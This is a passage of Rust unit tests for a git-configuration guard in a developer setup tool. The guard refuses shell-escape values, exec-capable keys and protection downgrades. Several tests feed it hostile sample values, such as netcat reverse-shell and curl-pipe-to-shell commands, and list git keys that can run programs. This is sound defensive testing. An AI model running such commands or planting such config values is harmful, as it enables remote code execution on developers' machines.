        #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
        {
            "cache"
        }
    }
}

/// Get a current git config value
#[allow(dead_code)] // Public API for config inspection
pub fn get_git_config(key: &str, scope: ConfigScope) -> Option<String> {
    let scope_flag = match scope {
        ConfigScope::Global => "--global",
        ConfigScope::Local => "--local",
    };

    let output = Command::new("git")
        .args(["config", scope_flag, "--get", key])
        .output()
        .ok()?;

    if output.status.success() {
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        None
    }
}

/// Check if a signing key file exists
#[allow(dead_code)] // Public API for key validation
pub fn signing_key_exists(key_path: &str) -> bool {
    let expanded = shellexpand::tilde(key_path);
    Path::new(expanded.as_ref()).exists()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git::config::AutoCrlf;
    use std::sync::Mutex;

    /// Serializes tests that mutate process-global env vars so they don't race,
    /// and force the var to a known state (rather than sensing ambient state,
    /// which yields "passes forever" no-ops when the var leaks in from CI).
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    /// Run `f` with `key` forced to `value` (`None` = unset), restoring the
    /// prior value afterward. Holds `ENV_LOCK` for the duration.
    #[allow(unsafe_code)]
    fn with_env<R>(key: &str, value: Option<&str>, f: impl FnOnce() -> R) -> R {
        let _guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let prev = std::env::var(key).ok();
        // SAFETY: single-threaded within the ENV_LOCK critical section.
        unsafe {
            match value {
                Some(v) => std::env::set_var(key, v),
                None => std::env::remove_var(key),
            }
        }
        let out = f();
        // SAFETY: same lock still held; restore the prior state.
        unsafe {
            match prev {
                Some(v) => std::env::set_var(key, v),
                None => std::env::remove_var(key),
            }
        }
        out
    }

    #[test]
    fn test_default_credential_helper() {
        let helper = GitSetup::default_credential_helper();
        assert!(!helper.is_empty());
    }

    #[test]
    fn test_git_setup_builder() {
        let config = GitConfig::default();
        let setup = GitSetup::new(config.clone())
            .with_project_dir(PathBuf::from("/tmp/test"))
            .quiet(true);

        assert!(setup.quiet);
        assert_eq!(setup.project_dir, Some(PathBuf::from("/tmp/test")));
    }

    #[test]
    fn test_autocrlf_as_str() {
        assert_eq!(AutoCrlf::True.as_str(), "true");
        assert_eq!(AutoCrlf::False.as_str(), "false");
        assert_eq!(AutoCrlf::Input.as_str(), "input");
    }

    #[test]
    fn env_flag_enabled_accepts_documented_spellings() {
        for v in ["1", "true", "TRUE", "yes", "Yes"] {
            with_env("JARVY_TEST_FLAG_X", Some(v), || {
                assert!(env_flag_enabled("JARVY_TEST_FLAG_X"), "{v} should enable");
            });
        }
        for v in ["0", "no", "off", "nope", ""] {
            with_env("JARVY_TEST_FLAG_X", Some(v), || {
                assert!(
                    !env_flag_enabled("JARVY_TEST_FLAG_X"),
                    "{v} should not enable"
                );
            });
        }
        with_env("JARVY_TEST_FLAG_X", None, || {
            assert!(
                !env_flag_enabled("JARVY_TEST_FLAG_X"),
                "unset should not enable"
            );
        });
    }

    #[test]
    fn value_is_shell_escape_detects_bang_prefix() {
        assert!(value_is_shell_escape("!nc attacker 4444 -e /bin/sh"));
        assert!(value_is_shell_escape("!"));
        assert!(!value_is_shell_escape("/usr/bin/vim"));
        assert!(!value_is_shell_escape("osxkeychain"));
        assert!(!value_is_shell_escape("checkout"));
    }

    // Security F1 / QA F7: git strips leading whitespace from config values,
    // so `" !cmd"` is still a shell value and must be caught.
    #[test]
    fn value_is_shell_escape_detects_leading_whitespace_bang() {
        assert!(value_is_shell_escape(" !cmd"));
        assert!(value_is_shell_escape("\t!cmd"));
        assert!(value_is_shell_escape("   !curl evil | sh"));
        assert!(!value_is_shell_escape("cmd !arg"));
    }

    #[test]
    fn set_config_refuses_bang_credential_helper() {
        let setup = GitSetup::new(GitConfig::default());
        let err = setup
            .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
            .unwrap_err();
        match err {
            GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, "credential.helper"),
            other => panic!("expected RefusedDangerousConfig, got {other:?}"),
        }
    }

    #[test]
    fn set_config_refuses_bang_core_editor() {
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("core.editor", "!/tmp/payload.sh"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn set_config_refuses_bang_alias_without_env_opt_in() {
        with_env("JARVY_ALLOW_SHELL_ALIASES", None, || {
            let setup = GitSetup::new(GitConfig::default());
            assert!(matches!(
                setup.set_config("alias.x", "!curl evil | sh"),
                Err(GitError::RefusedDangerousConfig(_, _))
            ));
        });
    }

    #[test]
    fn every_shell_interpreted_key_refuses_bang_prefix() {
        let setup = GitSetup::new(GitConfig::default());
        for key in GIT_SHELL_INTERPRETED_KEYS {
            let err = setup.set_config(key, "!evil").unwrap_err_or_else_panic();
            match err {
                GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, *key),
                other => panic!("expected RefusedDangerousConfig for {key}, got {other:?}"),
            }
        }
    }

    // ---- validate_extra_key --------------------------------------------

    #[test]
    fn validate_extra_key_accepts_dotted_keys() {
        assert!(validate_extra_key("core.fsmonitor").is_ok());
        assert!(validate_extra_key("feature.manyFiles").is_ok());
        assert!(validate_extra_key("url.https://github.com/.insteadOf").is_err()); // colon/slash rejected
        assert!(validate_extra_key("diff.colorMoved").is_ok());
        assert!(validate_extra_key("branch.main.rebase").is_ok());
    }

    #[test]
    fn validate_extra_key_rejects_flag_injection() {
        assert!(matches!(
            validate_extra_key("--global"),
            Err(GitError::InvalidConfigKey(_, _))
        ));
        assert!(matches!(
            validate_extra_key("-f"),
            Err(GitError::InvalidConfigKey(_, _))
        ));
    }

    #[test]
    fn validate_extra_key_rejects_malformed_grammar() {
        assert!(validate_extra_key("").is_err());
        assert!(validate_extra_key("nodots").is_err());
        assert!(validate_extra_key(".leading").is_err());
        assert!(validate_extra_key("trailing.").is_err());
        assert!(validate_extra_key("double..dot").is_err());
        assert!(validate_extra_key("has space.key").is_err());
        assert!(validate_extra_key("shell$.key").is_err());
    }

    // QA F4: byte-length cap boundary.
    #[test]
    fn validate_extra_key_length_boundary() {
        let mut k = "a.aa".repeat(64); // 256 bytes, valid charset, no `..`
        assert_eq!(k.len(), 256);
        assert!(validate_extra_key(&k).is_ok());
        k.push('a'); // 257 bytes
        assert!(matches!(
            validate_extra_key(&k),
            Err(GitError::InvalidConfigKey(_, _))
        ));
    }

    // QA F9: non-ASCII / multibyte keys rejected by the byte-wise charset check.
    #[test]
    fn validate_extra_key_rejects_non_ascii() {
        assert!(validate_extra_key("caf\u{e9}.key").is_err());
        assert!(validate_extra_key("core.f\u{200b}oo").is_err()); // zero-width space
    }

    // ---- os_default_plan (pure decision, no git I/O) -------------------

    #[test]
    fn os_default_autocrlf_matches_host() {
        let expected = if cfg!(target_os = "windows") {
            "true"
        } else {
            "input"
        };
        assert_eq!(GitSetup::os_default_autocrlf(), expected);
    }

    #[test]
    fn os_default_plan_disabled_is_empty() {
        let cfg = GitConfig {
            os_defaults: Some(false),
            ..GitConfig::default()
        };
        assert!(GitSetup::new(cfg).os_default_plan().is_empty());
    }

    #[test]
    fn os_default_plan_enabled_includes_recommended_and_autocrlf() {
        // os_defaults = None → enabled.
        let plan = GitSetup::new(GitConfig::default()).os_default_plan();
        assert!(plan.iter().any(|(k, _)| *k == "fetch.prune"));
        assert!(plan.iter().any(|(k, _)| *k == "rerere.enabled"));
        assert!(
            plan.iter()
                .any(|(k, v)| *k == "merge.conflictStyle" && *v == "zdiff3")
        );
        assert!(plan.iter().any(|(k, _)| *k == "core.autocrlf"));
    }

    #[test]
    fn os_default_plan_skips_autocrlf_when_typed_field_set() {
        let cfg = GitConfig {
            autocrlf: Some(AutoCrlf::False),
            ..GitConfig::default()
        };
        let plan = GitSetup::new(cfg).os_default_plan();
        assert!(!plan.iter().any(|(k, _)| *k == "core.autocrlf"));
        assert!(plan.iter().any(|(k, _)| *k == "fetch.prune")); // others unaffected
    }

    #[test]
    fn os_default_plan_skips_keys_present_in_extra() {
        let mut cfg = GitConfig::default();
        cfg.extra
            .insert("fetch.prune".to_string(), "false".to_string());
        cfg.extra
            .insert("core.autocrlf".to_string(), "true".to_string());
        let plan = GitSetup::new(cfg).os_default_plan();
        assert!(!plan.iter().any(|(k, _)| *k == "fetch.prune"));
        assert!(!plan.iter().any(|(k, _)| *k == "core.autocrlf"));
        assert!(plan.iter().any(|(k, _)| *k == "rerere.enabled"));
    }

    // Security F1 QA F8: cfg-gated keys are verified on their native runner
    // via the pure plan (no git shell-out), so they get coverage somewhere.
    #[cfg(target_os = "macos")]
    #[test]
    fn os_default_plan_includes_precomposeunicode_on_macos() {
        let plan = GitSetup::new(GitConfig::default()).os_default_plan();
        assert!(
            plan.iter()
                .any(|(k, v)| *k == "core.precomposeunicode" && *v == "true")
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn os_default_plan_includes_longpaths_on_windows() {
        let plan = GitSetup::new(GitConfig::default()).os_default_plan();
        assert!(
            plan.iter()
                .any(|(k, v)| *k == "core.longpaths" && *v == "true")
        );
    }

    #[test]
    fn configure_os_defaults_opt_out_makes_no_git_calls() {
        // os_defaults = false → empty plan → no `git config` fork.
        let cfg = GitConfig {
            os_defaults: Some(false),
            ..GitConfig::default()
        };
        assert!(GitSetup::new(cfg).configure_os_defaults().is_ok());
    }

    // ---- is_exec_capable_key + configure_extra RCE guards --------------

    #[test]
    fn is_exec_capable_key_matches_executed_keys() {
        for k in [
            "core.pager",
            "core.sshCommand", // case-insensitive
            "core.hooksPath",
            "core.fsmonitor",
            "sequence.editor",
            "diff.external",
            "credential.helper",
            "filter.lfs.clean",
            "filter.lfs.process",
            "diff.mydriver.textconv",
            "mergetool.mine.cmd",
            "difftool.mine.cmd",
            "gpg.ssh.program",
            "uploadpack.packObjectsHook",
            // Round-2 Security F2 additions:
            "core.askPass",
            "init.templateDir",
            "pager.log",
            "pager.diff",
            "merge.mydriver.driver",
            "remote.origin.uploadpack",
            "remote.origin.receivepack",
        ] {
            assert!(is_exec_capable_key(k), "{k} should be exec-capable");
        }
        for k in [
            "core.autocrlf",
            "fetch.prune",
            "diff.colorMoved",
            "filter.lfs.required",
            "core.longpaths",
            "pager", // the bare key is not a per-command pager
            "merge.conflictStyle",
            "remote.origin.url",
        ] {
            assert!(!is_exec_capable_key(k), "{k} should NOT be exec-capable");
        }
    }

    // Security F1 (P0): exec-capable keys are refused OUTRIGHT (any value, no
    // `!` needed) — the RCE the `!`-only filter missed.
    #[test]
    fn configure_extra_refuses_exec_capable_keys() {
        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
            for key in [
                "core.pager",
                "core.sshCommand",
                "core.hooksPath",
                "filter.lfs.clean",
            ] {
                let mut cfg = GitConfig::default();
                cfg.extra
                    .insert(key.to_string(), "totally-benign-looking".to_string());
                assert!(
                    matches!(
                        GitSetup::new(cfg).configure_extra(),
                        Err(GitError::RefusedDangerousConfig(_, _))
                    ),
                    "exec-capable key {key} must be refused"
                );
            }
        });
    }

    // `core.fsmonitor = true|false` is the safe builtin toggle (a documented
    // `[git.extra]` example) and must NOT be refused; a program path must be.
    #[test]
    fn exec_key_value_safe_exception_for_fsmonitor() {
        assert!(exec_key_value_is_safe("core.fsmonitor", "true"));
        assert!(exec_key_value_is_safe("core.fsmonitor", "false"));
        assert!(exec_key_value_is_safe("CORE.FSMONITOR", " True "));
        assert!(!exec_key_value_is_safe("core.fsmonitor", "/usr/bin/evil"));
        // No exception for the hard exec keys.
        assert!(!exec_key_value_is_safe("core.hooksPath", "true"));
        assert!(!exec_key_value_is_safe("core.pager", "true"));
    }

    // QA F3: the override actually lifts the exec-key refusal. `check_extra_entry`
    // is the pure gauntlet (no git I/O), so we can drive the real branch.
    #[test]
    fn check_extra_entry_exec_override_lifts_refusal() {
        let setup = GitSetup::new(GitConfig::default());
        // Without override → refused.
        assert!(matches!(
            setup.check_extra_entry("core.pager", "less", false),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
        // With override → the exec guard no longer refuses a metachar-free value.
        assert!(setup.check_extra_entry("core.pager", "less", true).is_ok());
    }

    // QA F7: the exec override must NOT bypass the `!`-shell refusal (step 5).
    #[test]
    fn check_extra_entry_exec_override_still_refuses_bang() {
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.check_extra_entry("core.pager", "!curl evil | sh", true),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    // QA F6: exec-capable check precedes the shell-escape check (an exec key with
    // a `!` value is caught at the exec step, not step 5) — pinned via the
    // override: with the exec override lifted, the `!` value still trips step 5,
    // proving both guards run and in this order.
    #[test]
    fn check_extra_entry_order_exec_then_shell() {
        let setup = GitSetup::new(GitConfig::default());
        // Non-exec key with `!` → refused by step 5 only.
        assert!(matches!(
            setup.check_extra_entry("format.pretty", "!x", false),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
        // Exec key without override → refused (step 3) even with a benign value.
        assert!(matches!(
            setup.check_extra_entry("core.pager", "less", false),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    // Security F4 (P2): leading-`-` value is argv option-injection into git config.
    #[test]
    fn configure_extra_refuses_leading_dash_value() {
        let mut cfg = GitConfig::default();
        cfg.extra
            .insert("core.autocrlf".to_string(), "--unset".to_string());
        assert!(matches!(
            GitSetup::new(cfg).configure_extra(),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    // `!`-value on a benign (non-exec, non-guardrail) key is still refused.
    #[test]
    fn configure_extra_refuses_bang_value_for_benign_key() {
        let mut cfg = GitConfig::default();
        cfg.extra
            .insert("format.pretty".to_string(), "!evil".to_string());
        assert!(matches!(
            GitSetup::new(cfg).configure_extra(),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn configure_extra_rejects_bad_key_before_running_git() {
        let mut cfg = GitConfig::default();
        cfg.extra.insert("--global".to_string(), "true".to_string());
        assert!(matches!(
            GitSetup::new(cfg).configure_extra(),
            Err(GitError::InvalidConfigKey(_, _))
        ));
    }

    // ---- check_not_protect_downgrade (Security F3/F6, QA F5/F6) --------

    #[test]
    fn check_protect_downgrade_refuses_weakening() {
        with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", None, || {
            // Original guardrails.
            assert!(check_not_protect_downgrade("core.protectNTFS", "false").is_err());
            assert!(check_not_protect_downgrade("core.protectHFS", "off").is_err());
            assert!(check_not_protect_downgrade("safe.directory", "*").is_err());
            assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "ignore").is_err());
            // Case-insensitive on key and value.
            assert!(check_not_protect_downgrade("CORE.PROTECTNTFS", "NO").is_err());
            // Whitespace-trimmed (QA F5) — else `" false "` slips past.
            assert!(check_not_protect_downgrade("core.protectNTFS", " false ").is_err());
            assert!(check_not_protect_downgrade("safe.directory", "  *  ").is_err());
            // Empty value is falsey → refused for protect keys.
            assert!(check_not_protect_downgrade("core.protectNTFS", "").is_err());
            // Widened coverage (Security F3/F6, QA F6).
            assert!(check_not_protect_downgrade("safe.bareRepository", "all").is_err());
            assert!(
                check_not_protect_downgrade("fetch.fsck.zeroPaddedFilemode", "ignore").is_err()
            );
            assert!(
                check_not_protect_downgrade("receive.fsck.zeroPaddedFilemode", "ignore").is_err()
            );
            assert!(check_not_protect_downgrade("receive.fsckObjects", "false").is_err());
            assert!(check_not_protect_downgrade("transfer.fsckObjects", "0").is_err());
            assert!(check_not_protect_downgrade("fetch.fsckObjects", "no").is_err());
            // Round-2 Security F3: TLS-verification downgrade.
            assert!(check_not_protect_downgrade("http.sslVerify", "false").is_err());
            assert!(check_not_protect_downgrade("http.https://x.example/.sslVerify", "0").is_err());
        });
    }

    // Pure classifier — no env/telemetry, so directly testable.
    #[test]
    fn protect_downgrade_violation_classifies() {
        assert_eq!(
            protect_downgrade_violation("http.sslVerify", "false").map(|(g, _)| g),
            Some("tls_verify_disabled")
        );
        assert_eq!(
            protect_downgrade_violation("safe.bareRepository", "all").map(|(g, _)| g),
            Some("safe_bare_repository")
        );
        assert_eq!(
            protect_downgrade_violation("receive.fsckObjects", "false").map(|(g, _)| g),
            Some("fsck_objects_disabled")
        );
        assert!(protect_downgrade_violation("http.sslVerify", "true").is_none());
        assert!(protect_downgrade_violation("core.autocrlf", "input").is_none());
    }

    #[test]
    fn check_protect_downgrade_allows_safe_values() {
        with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", None, || {
            assert!(check_not_protect_downgrade("core.protectNTFS", "true").is_ok());
            assert!(check_not_protect_downgrade("safe.directory", "/srv/repo").is_ok());
            assert!(check_not_protect_downgrade("safe.bareRepository", "explicit").is_ok());
            assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "warn").is_ok());
            assert!(check_not_protect_downgrade("receive.fsckObjects", "true").is_ok());
            // Keys the guard doesn't cover pass through here (exec policy handles
            // core.fsmonitor separately, in configure_extra).
            assert!(check_not_protect_downgrade("core.whitespace", "false").is_ok());
        });
    }

    // QA F3 / F10: prove the env opt-out actually ALLOWS, deterministically.
    #[test]
    fn check_protect_downgrade_env_override_allows() {
        for v in ["1", "true", "TRUE", "yes"] {
            with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", Some(v), || {
                assert!(
                    check_not_protect_downgrade("core.protectNTFS", "false").is_ok(),
                    "override value {v} should allow"
                );
                assert!(check_not_protect_downgrade("safe.directory", "*").is_ok());
            });
        }
        // Non-truthy values do NOT lift the guard.
        for v in ["0", "no", "nope", ""] {
            with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", Some(v), || {
                assert!(check_not_protect_downgrade("core.protectNTFS", "false").is_err());
            });
        }
    }

    #[test]
    fn configure_extra_refuses_protect_downgrade() {
        with_env("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE", None, || {
            let mut cfg = GitConfig::default();
            cfg.extra
                .insert("core.protectNTFS".to_string(), "false".to_string());
            assert!(matches!(
                GitSetup::new(cfg).configure_extra(),
                Err(GitError::RefusedDangerousConfig(_, _))
            ));
        });
    }

    // ---- Round-2 Security F1: typed-field exec guard in set_config ----------

    #[test]
    fn value_has_shell_metachars_detects_injection() {
        for v in [
            "vim; curl evil | sh",
            "a && b",
            "x$(evil)",
            "a`b`",
            "a | b",
            "a > /etc/x",
            "a\nb",
        ] {
            assert!(value_has_shell_metachars(v), "{v:?} should flag");
        }
        for v in [
            "vim",
            "code --wait",
            "/usr/bin/subl -w",
            "emacsclient -a ''",
        ] {
            assert!(!value_has_shell_metachars(v), "{v:?} should be clean");
        }
    }

    #[test]
    fn credential_helper_program_path_detection() {
        for v in ["/tmp/evil", "./evil", "~/evil", "sub/dir/evil"] {
            assert!(credential_helper_is_program_path(v), "{v:?} is a path");
        }
        for v in [
            "osxkeychain",
            "cache --timeout=3600",
            "store --file=/x",
            "manager-core",
        ] {
            assert!(
                !credential_helper_is_program_path(v),
                "{v:?} is a bare helper"
            );
        }
    }

    // The typed `editor`/`credential_helper` fields funnel through set_config,
    // which must refuse shell-metachar / `!` / program-path values (the RCE the
    // exec denylist only closed for `[git.extra]`). Refusals return before any
    // git I/O, so these are safe unit tests.
    #[test]
    fn set_config_refuses_shell_metachar_editor() {
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("core.editor", "vim; curl evil | sh"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
        assert!(matches!(
            setup.set_config("core.editor", "$(evil)"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn set_config_refuses_credential_helper_program_path() {
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("credential.helper", "/tmp/evil"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn set_config_exec_key_override_lifts_metachar_refusal() {
        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", Some("1"), || {
            // Refusal is lifted; classifier no longer short-circuits. We can't
            // assert the subsequent git write without I/O, but proving the guard
            // is env-gated is the point (the value itself is metachar-laden).
            assert!(env_flag_enabled("JARVY_ALLOW_GIT_EXEC_KEYS"));
            assert!(value_has_shell_metachars("a; b"));
        });
    }

    // ---- QA F4: parse_null_config (pure) ------------------------------------

    #[test]
    fn parse_null_config_handles_empty_and_filters_want() {
        let want: std::collections::HashSet<String> =
            ["core.autocrlf", "merge.conflictstyle", "user.name"]
                .iter()
                .map(|s| s.to_string())
                .collect();
        // Records: NUL-separated, each "key\nvalue"; user.name has empty value;
        // rerere.enabled is not in `want` and must be dropped.
        let stdout = b"core.autocrlf\ninput\0merge.conflictstyle\nzdiff3\0user.name\n\0rerere.enabled\ntrue\0";
        let map = parse_null_config(stdout, &want);
        assert_eq!(map.get("core.autocrlf").map(String::as_str), Some("input"));
        assert_eq!(
            map.get("merge.conflictstyle").map(String::as_str),
            Some("zdiff3")
        );
        assert_eq!(map.get("user.name").map(String::as_str), Some("")); // empty value kept
        assert!(!map.contains_key("rerere.enabled")); // filtered out
    }

    // ---- QA F5: os_defaults_to_write skip-if-matches (pure) -----------------

    #[test]
    fn os_defaults_to_write_skips_matching_case_insensitively() {
        let plan = vec![
            ("core.autocrlf", "input"),
            ("fetch.prune", "true"),
            ("merge.conflictStyle", "zdiff3"),
        ];
        // existing has git-lowercased keys; conflictstyle already matches, prune
        // matches, autocrlf differs → only autocrlf should be written.
        let mut existing = std::collections::HashMap::new();
        existing.insert("merge.conflictstyle".to_string(), "zdiff3".to_string());
        existing.insert("fetch.prune".to_string(), "true".to_string());
        existing.insert("core.autocrlf".to_string(), "false".to_string());
        let to_write = os_defaults_to_write(&plan, &existing);
        assert_eq!(to_write, vec![("core.autocrlf", "input")]);
    }

    #[test]
    fn os_defaults_to_write_all_when_existing_empty() {
        let plan = vec![("fetch.prune", "true"), ("rerere.enabled", "true")];
        let existing = std::collections::HashMap::new();
        assert_eq!(os_defaults_to_write(&plan, &existing), plan);
    }

    /// Helper trait so the loop above reads naturally.
    trait UnwrapErrOrPanic<T, E: std::fmt::Debug> {
        fn unwrap_err_or_else_panic(self) -> E;
    }
    impl<T: std::fmt::Debug, E: std::fmt::Debug> UnwrapErrOrPanic<T, E> for Result<T, E> {
        fn unwrap_err_or_else_panic(self) -> E {
            match self {
                Ok(v) => panic!("expected Err, got Ok({v:?})"),
                Err(e) => e,
            }
        }
    }
}
